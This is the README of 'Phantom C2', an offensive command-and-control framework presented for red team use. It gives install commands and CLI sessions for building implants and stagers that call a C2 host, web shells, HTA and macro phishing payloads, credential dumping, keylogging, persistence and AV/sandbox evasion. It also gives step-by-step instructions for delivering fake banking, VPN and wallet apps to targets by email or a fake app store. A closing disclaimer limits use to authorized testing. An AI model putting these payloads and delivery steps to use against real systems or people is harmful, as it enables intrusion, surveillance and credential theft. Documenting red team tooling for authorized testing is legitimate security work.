# Phantom C2

```
    ___  __  __   ___   _  __ ______ ____   __  ___
   / _ \/ / / /  / _ | / |/ //_  __// __ \ /  |/  /
  / ___/ /_/ /  / __ |/    /  / /  / /_/ // /|_/ /
 /_/   \____/  /_/ |_/_/|_/  /_/   \____//_/  /_/

  [::] Phantom C2 Framework — Red Team Operations
```

<p align="center">
  <strong>A modern Command & Control framework for authorized red team engagements</strong>
</p>

<p align="center">
  <a href="#features">Features</a> |
  <a href="#installation">Installation</a> |
  <a href="#usage">Usage</a> |
  <a href="#agent-capabilities">Agent Capabilities</a> |
  <a href="#payload-generation">Payloads</a> |
  <a href="#disclaimer">Disclaimer</a>
</p>

---

## Screenshots

### Login & Mode Selection
![Login](docs/assets/screenshot-login.png)

### Web UI Dashboard (Cobalt Strike-style graphs)
![Web UI](docs/assets/screenshot-webui-overview.png)

### Server Startup
![Startup](docs/assets/screenshot-startup.png)

### Agent Management
![Agents](docs/assets/screenshot-agents.png)

### Agent Interaction & Shell
![Interact](docs/assets/screenshot-interact.png)

### Active Directory Commands
![AD Commands](docs/assets/screenshot-ad-commands.png)

### Payload Generation
![Generate](docs/assets/screenshot-generate.png)

### Mobile App Builder (30+ Templates)
![App Templates](docs/assets/screenshot-app-templates.png)

### Mobile Payload Generation (Android + iOS)
![Mobile Payloads](docs/assets/screenshot-mobile-payloads.png)

### Mobile Agent Callback
![Mobile Callback](docs/assets/screenshot-mobile-callback.png)

### All Commands (35+)
![Help](docs/assets/screenshot-help.png)

### Agent Capabilities
![Agent Help](docs/assets/screenshot-agent-help.png)

### Web UI, Reports & Webhooks
![WebUI](docs/assets/screenshot-webui-report.png)

---

## Features

**Interface**
- **Dual interface** — choose CLI, Web UI, or both on startup
- **Operator authentication** — first-run setup + masked password login
- **Web UI dashboard** — Cobalt Strike/Mythic-inspired dark theme with beacon graphs, network topology, agent cards, interactive terminal
- **CLI shell** — styled prompt with session recording and real-time event notifications

**Communications**
- **HTTP/HTTPS/DNS listeners** with malleable communication profiles
- **Encrypted comms** — RSA-2048 key exchange + AES-256-GCM with auto key rotation
- **3 malleable profiles** — Default, Microsoft 365, Cloudflare Workers
- **SMB/Unix socket pivoting** — agent-to-agent relay for lateral access
- **Mobile endpoint** — `/api/v1/mobile/checkin` for Android/iOS callbacks

**Evasion & Stealth**
- **AMSI bypass** — patches AmsiScanBuffer
- **ETW bypass** — patches EtwEventWrite
- **ntdll unhooking** — loads clean .text from disk
- **Process hollowing** — CreateProcess suspended + QueueUserAPC
- **Sandbox detection** — uptime, CPU, hostname, environment checks
- **Mobile evasion** — anti-emulator, anti-Frida, anti-debug, anti-AV (25+ packages), sandbox timing delay

**Execution**
- **In-memory BOF** — COFF parser (Windows), memfd_create (Linux)
- **Shellcode execution** — VirtualAlloc/mmap, zero disk footprint
- **Process injection** — CreateRemoteThread
- **22 AD commands** — enumeration, Kerberoasting, DCSync, lateral movement

**Post-Exploitation**
- **Token manipulation** — steal, make, revert, impersonate
- **Keylogger** — GetAsyncKeyState (Windows), xinput (Linux)
- **SOCKS5 proxy** + port forwarding — pivot through agents
- **Credential harvesting** — browser, WiFi, clipboard, SSH, RDP, vault
- **5 persistence methods** — registry, schtask, cron, systemd, bashrc

**Payload Generation (16+ types)**
- **Agent binaries** — Windows EXE, Linux ELF, garble-obfuscated
- **Web shells** — ASPX, PHP, JSP (token-protected with 404 decoy)
- **Stagers** — PowerShell, Bash, Python, HTA, VBA macro
- **Mobile** — Android APK builder (30+ fake app templates), iOS MDM + phishing
- **Mobile evasion auto-included** — all generated apps bypass security analysis

**Operations**
- **Engagement reporting** — Markdown + CSV with full activity timeline
- **Webhook notifications** — Slack/Discord alerts on events
- **Session recording** — every command logged for documentation
- **Built-in diagnostics** — `--doctor` flag checks 25+ system requirements
- **Docker deployment** — `docker-compose up -d` one-liner
- **Versioning** — CHANGELOG.md, git tags, `--version` flag
- **Engagement reporting** — auto-generate Markdown/CSV reports with full activity timeline
- **Webhook notifications** — Slack/Discord alerts on agent registration and events
- **Session recording** — every command and output logged for documentation
- **Docker deployment** — `docker-compose up -d` one-liner

---

## Installation

### Linux (Kali / Ubuntu / Debian)

```bash
# Step 1: Install Go (if not already installed)
sudo apt update
sudo apt install -y golang-go git make

# Verify Go version (1.22+ required)
go version

# Step 2: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 3: Install dependencies
go mod tidy

# Step 4: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 5: Generate RSA keypair (required for encrypted comms)
go run ./cmd/keygen -out configs/

# Step 6: (Optional) Generate TLS certificates for HTTPS listeners
bash scripts/generate_certs.sh

# Step 7: Build the server
make server

# Step 8: Start Phantom
./build/phantom-server --config configs/server.yaml
```

### Windows

```powershell
# Step 1: Install Go
# Download from https://go.dev/dl/ and run the installer
# Or use winget:
winget install GoLang.Go

# Restart your terminal after installing Go, then verify:
go version

# Step 2: Install Git (if not already installed)
winget install Git.Git

# Step 3: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 4: Install dependencies
go mod tidy

# Step 5: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 6: Generate RSA keypair
go run ./cmd/keygen -out configs/

# Step 7: Build the server
go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server

# Step 8: Start Phantom
.\build\phantom-server.exe --config configs\server.yaml
```

### Quick Install (One-liner)

**Linux:**
```bash
git clone https://github.com/Phantom-C2-77/Phantom.git && cd Phantom && go mod tidy && go run ./cmd/keygen -out configs/ && make server && ./build/phantom-server --config configs/server.yaml
```

**Windows (PowerShell):**
```powershell
git clone https://github.com/Phantom-C2-77/Phantom.git; cd Phantom; go mod tidy; go run ./cmd/keygen -out configs/; go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server; .\build\phantom-server.exe --config configs\server.yaml
```

### Docker (Recommended)

```bash
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom
docker-compose up -d
docker attach phantom-c2
```

Exposes: HTTP (8080), HTTPS (443), DNS (53), Web UI (3000)

---

## Usage

### Starting the Server

```bash
./build/phantom-server --config configs/server.yaml
```

You will see:

```
    ___  __  __   ___   _  __ ______ ____   __  ___
   / _ \/ / / /  / _ | / |/ //_  __// __ \ /  |/  /
  / ___/ /_/ /  / __ |/    /  / /  / /_/ // /|_/ /
 /_/   \____/  /_/ |_/_/|_/  /_/   \____//_/  /_/

  [::] Phantom C2 Framework — Red Team Operations
  [::] Version: dev

  [*] Loading configuration from configs/server.yaml
  [*] Initializing server...
  [+] Listener 'fallback-http' started on 0.0.0.0:8080 (http)
  [+] Phantom C2 server ready
  [*] Type 'help' for available commands

  phantom >
```

### Global Commands

```
  phantom > help

  Phantom C2 — Commands
  ─────────────────────────────────────────

  agents                         List all connected agents
  interact <name|id>             Interact with an agent
  listeners [start|stop] <name>  Manage listeners
  tasks [agent]                  View task history
  generate <type> [url]          Build agent or generate payload
  remove <name|id>               Remove a dead agent
  loot [agent]                   View captured loot
  events                         View event log
  clear                          Clear screen
  help                           Show this help
  exit                           Shutdown and exit
```

### Interacting with Agents

```
  phantom > agents
  ┌──────────┬───────────────┬─────────┬──────────┬───────┬─────────────┬──────────┬──────────┬────────┐
  │    ID    │     Name      │   OS    │ Hostname │ User  │     IP      │  Sleep   │ Last Seen│ Status │
  ├──────────┼───────────────┼─────────┼──────────┼───────┼─────────────┼──────────┼──────────┼────────┤
  │ a3f2e8c1 │ silent-falcon │ windows │ DC-PROD  │ admin │ 10.0.1.42   │ 10s/20%  │ 2s ago   │ active │
  │ b7d4f091 │ dark-raven    │ linux   │ web-01   │ root  │ 10.0.1.100  │ 10s/20%  │ 5s ago   │ active │
  └──────────┴───────────────┴─────────┴──────────┴───────┴─────────────┴──────────┴──────────┴────────┘

  phantom > interact silent-falcon
  [+] Interacting with silent-falcon (admin@DC-PROD)

  phantom [silent-falcon] > shell whoami
  [+] Task queued (ID: a3f2e8c1) — waiting for agent check-in...
  [+] Result:
      dc-prod\admin

  phantom [silent-falcon] > ad-help
  (shows all 22 AD commands)

  phantom [silent-falcon] > ad-enum-users
  phantom [silent-falcon] > ad-kerberoast
  phantom [silent-falcon] > screenshot
  phantom [silent-falcon] > persist registry
  phantom [silent-falcon] > back
```

### Agent Commands (inside `interact` session)

| Command | Description |
|---------|-------------|
| `shell <command>` | Execute shell command (cmd.exe / /bin/sh) |
| `upload <local> <remote>` | Upload file to agent |
| `download <remote>` | Download file from agent |
| `screenshot` | Capture screenshot |
| `ps` | List running processes |
| `sysinfo` | Get system information |
| `persist <method>` | Install persistence (registry/schtask/cron/service/bashrc) |
| `sleep <sec> [jitter%]` | Change sleep interval |
| `cd <path>` | Change working directory |
| `bof <file> [args]` | Execute Beacon Object File (in-memory) |
| `shellcode <file>` | Execute raw shellcode in-memory |
| `inject <pid> <file>` | Inject shellcode into remote process |
| `ad-*` | Active Directory commands (type `ad-help`) |
| `kill` | Terminate the agent |
| `info` | Show agent details |
| `tasks` | Show task history |
| `back` | Return to main menu |

---

## Agent Capabilities

| Capability | Windows | Linux |
|-----------|---------|-------|
| Shell Execution | cmd.exe | /bin/sh |
| File Upload/Download | Yes | Yes |
| Screenshot | PowerShell GDI | import/scrot/xwd |
| Process List | tasklist | ps aux |
| System Info | Full | Full |
| Persistence | Registry Run Key, Scheduled Task | Cron, Systemd Service, .bashrc |
| BOF Execution | In-memory COFF loader | memfd_create |
| Shellcode Execution | VirtualAlloc + CreateThread | mmap RWX |
| Process Injection | CreateRemoteThread | N/A |
| Sandbox Detection | Yes | Yes |

### Active Directory Commands (22 total)

**Enumeration:** `ad-enum-domain`, `ad-enum-users`, `ad-enum-groups`, `ad-enum-computers`, `ad-enum-shares`, `ad-enum-spns`, `ad-enum-gpo`, `ad-enum-trusts`, `ad-enum-admins`, `ad-enum-asrep`, `ad-enum-delegation`, `ad-enum-laps`

**Attacks:** `ad-kerberoast`, `ad-asreproast`, `ad-dcsync`

**Credential Access:** `ad-dump-sam`, `ad-dump-lsa`, `ad-dump-tickets`

**Lateral Movement:** `ad-psexec`, `ad-wmi`, `ad-winrm`, `ad-pass-the-hash`

---

## Building Agents

### From the Phantom CLI

```
phantom > generate exe https://your-c2.com:443
[*] Building windows/amd64 agent...
[+] Agent built successfully!
  Output:      build/agents/phantom-agent_windows_amd64.exe
  Size:        6.4 MB
  Platform:    windows/amd64
  Listener:    https://your-c2.com:443
  Sleep:       10s / 20%
```

### From Make

```bash
# Windows agent
make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Linux agent
make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Obfuscated (garble)
make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
```

---

## Payload Generation

### From the Phantom CLI

```
phantom > generate aspx https://your-c2.com:443
[+] Payload generated: build/payloads/update.aspx
[*] Upload to target web server, then access with:
  curl -X POST -H 'X-Debug-Token: <token>' -d 'data=whoami' <url>

phantom > generate php https://your-c2.com:443
phantom > generate jsp https://your-c2.com:443
phantom > generate powershell https://your-c2.com:443
phantom > generate bash https://your-c2.com:443
phantom > generate python https://your-c2.com:443
phantom > generate hta https://your-c2.com:443
phantom > generate vba https://your-c2.com:443
```

| Payload | Platform | Description |
|---------|----------|-------------|
| `aspx` | IIS/ASP.NET | Token-protected web shell with 404 decoy |
| `php` | Apache/Nginx | Multi-fallback execution (5 methods) |
| `jsp` | Tomcat/Java | Cross-platform web shell |
| `powershell` | Windows | Download & execute stager |
| `bash` | Linux | curl/wget stager |
| `python` | Cross-platform | SSL-capable stager |
| `hta` | Windows | Phishing payload (base64 PS cradle) |
| `vba` | Windows | Office macro (AutoOpen) |

---

## Mobile Payloads (Android + iOS)

### Quick Start — Android App with C2 Callback

```bash
# Step 1: Generate a fake VPN app
phantom > generate app vpn-shield https://YOUR-C2-IP:8080

# Step 2: Build the APK
cd build/payloads/apps/vpn_shield
# Open in Android Studio → Build → Build APK
# Or: gradle assembleRelease

# Step 3: Deliver to target
# - Send APK via email/message
# - Host on fake app store page
# - QR code linking to download

# Step 4: When target installs and opens the app
# - They see a legitimate VPN interface
# - Background service starts C2 callback
# - Agent appears in Phantom: "phantom > agents"

# Step 5: Interact with mobile agent
phantom > interact toxic-cobra
phantom [toxic-cobra] > shell id
phantom [toxic-cobra] > sysinfo
phantom [toxic-cobra] > shell cat /proc/version
```

### Available App Templates (30+)

| Category | Templates |
|----------|-----------|
| Productivity | Calculator, QR Scanner, PDF Viewer, Notes, File Manager |
| Utility | Flashlight, WiFi Analyzer, Battery Saver, Cleaner, Speed Test |
| Security | VPN Shield, Password Manager, Authenticator, Antivirus Pro |
| Finance | Crypto Wallet, Banking App, Expense Tracker |
| Social | Chat Messenger, Video Call, Dating Connect |
| Entertainment | Music Player, Live TV, Game Hub |
| Corporate | Company Portal, HR Self-Service, IT Support |

### What Each App Includes

- **Realistic UI** — category-specific interface (banking dashboard, security shield, etc.)
- **Background C2 service** — survives app close, runs silently
- **Boot persistence** — auto-starts when device reboots
- **Remote shell** — execute commands on the device
- **Device info** — model, OS, manufacturer, device ID
- **Evasion suite** — anti-emulator, anti-debug, anti-Frida, anti-AV, sandbox timing delay

### Other Mobile Payloads

```bash
# Android-specific payloads (stagers + phishing)
phantom > generate android https://YOUR-C2-IP:8080

# iOS-specific payloads (MDM profile + Apple ID phishing)
phantom > generate ios https://YOUR-C2-IP:8080
```

### Mobile Evasion (Auto-Included)

All generated apps automatically include evasion that:
- Detects emulators (Genymotion, Nox, BlueStacks, QEMU)
- Detects security apps (25+ AV/MDM packages)
- Detects Frida instrumentation (3 detection methods)
- Detects debuggers and analysis tools
- Delays C2 callback 60-120s to outlast sandbox analysis
- Stays fully dormant if any analysis is detected

---

## Configuration

### Server Config (configs/server.yaml)

```yaml
server:
  database: "data/phantom.db"
  rsa_private_key: "configs/server.key"
  rsa_public_key: "configs/server.pub"
  default_sleep: 10
  default_jitter: 20

listeners:
  - name: "default-https"
    type: "https"
    bind: "0.0.0.0:443"
    profile: "default"
    tls_cert: "configs/server.crt"
    tls_key: "configs/server-tls.key"

  - name: "fallback-http"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "default"
```

### Malleable Profiles

Three built-in profiles in `configs/profiles/`:

- **default.yaml** — Generic API traffic (`/api/v1/status`)
- **microsoft.yaml** — Microsoft 365/Azure (`/common/oauth2/v2.0/token`)
- **cloudflare.yaml** — Cloudflare Workers (`/cdn-cgi/rum`)

---

## Web UI

Start the browser dashboard alongside the CLI:

```
phantom > webui
[+] Web UI started: http://127.0.0.1:3000
```

Features: real-time agent/listener/task tables, auto-refresh, dark theme, REST API.

## Engagement Reporting

```
phantom > report md       # Markdown report with full activity timeline
phantom > report csv      # CSV export of all commands and output
phantom > report all      # Both formats
```

Reports saved to `reports/` with timestamps. Includes: executive summary, per-agent timelines, command output, infrastructure details.

## Webhook Notifications

```
phantom > webhook slack https://hooks.slack.com/services/T.../B.../xxx
phantom > webhook discord https://discord.com/api/webhooks/xxx/yyy
phantom > webhook test
```

Auto-notifies on: new agent registration, agent death, listener events.

## Project Structure

```
phantom/
  cmd/
    server/          Server entrypoint
    agent/           Agent entrypoint
    keygen/          RSA keypair generator
    e2etest/         End-to-end test runner
  internal/
    server/          Core server, config, webhooks
    listener/        HTTP/HTTPS/DNS listeners + malleable profiles + SMB pipes
    agent/           Agent manager + builder
    task/            Task dispatcher + queues
    crypto/          RSA-2048, AES-256-GCM, key exchange
    protocol/        Wire protocol + msgpack serialization
    db/              SQLite database + repositories
    cli/             CLI shell (readline), tables, reporting
    webui/           Web dashboard (embedded HTML/JS)
    implant/         Agent: shell, file, screenshot, persist, AD, BOF, evasion,
                     token, keylogger, SOCKS, creds, pivot, staging
    payloads/        Payload generator (web shells, stagers, macros)
    util/            Shared utilities
  configs/           Server config + malleable profiles
  scripts/           Helper scripts
  docs/              Documentation + screenshots
  Dockerfile         Multi-stage Docker build
  docker-compose.yml One-line deployment
```

---

## Disclaimer

**This tool is designed for authorized red team engagements and security research only.**

Unauthorized access to computer systems is illegal. You are responsible for ensuring you have proper authorization before using this tool. The author accepts no liability for misuse.

Always:
- Obtain written authorization before testing
- Follow your organization's rules of engagement
- Document all activities
- Report findings responsibly

## Author

**Opeyemi Kolawole** - [GitHub](https://github.com/Phantom-C2-77) | ckkolawole77@gmail.com

## License

BSD 3-Clause License - see [LICENSE](LICENSE) for details.
